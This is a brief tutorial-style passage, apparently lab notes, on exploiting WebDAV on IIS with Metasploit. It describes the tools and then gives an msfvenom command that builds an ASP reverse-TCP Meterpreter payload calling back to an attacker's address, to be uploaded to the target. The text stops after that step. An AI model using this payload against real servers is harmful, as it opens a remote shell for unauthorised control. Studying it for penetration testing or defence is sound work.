# Exploiting IIS with Metasploit (WebDAV)

### What is WebDAV
Web Distributed Authoring and Versioning (WebDAV) is an HTTP protocol extension that allows users to collaboratively edit and manage files stored on remote web servers.


### Tools and Modules
- **Metasploit**


- **msfvenom** \
It is a payload generation tool that comes with the Metasploit Framework.
It lets attacker create custom malicious files that, **when executed or opened by a target, connect back to the attacker** and give control.

- **cadaver**\
Cadaver is a command-line WebDAV client available in Kali Linux that allows users to interact with WebDAV-enabled servers. 

- **multi/handler**\
metasploit module that essentially used to set up a listener for the malicurous that you created
<br>
<br>

### Practice

1. Upload malcious file\
Command breakdown\
Generate `payload` for Windows opens a `reverse TCP Meterpreter shell`\
`LHOST` is my attack machine's reachable IP address\
Listening port is `port 1234`\
Save generated ASP into a file called `meterpreter.asp` -> Upload the file
```bash
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST= <IP address> LPORT= 1234 -f asp> meterpreter.asp
```

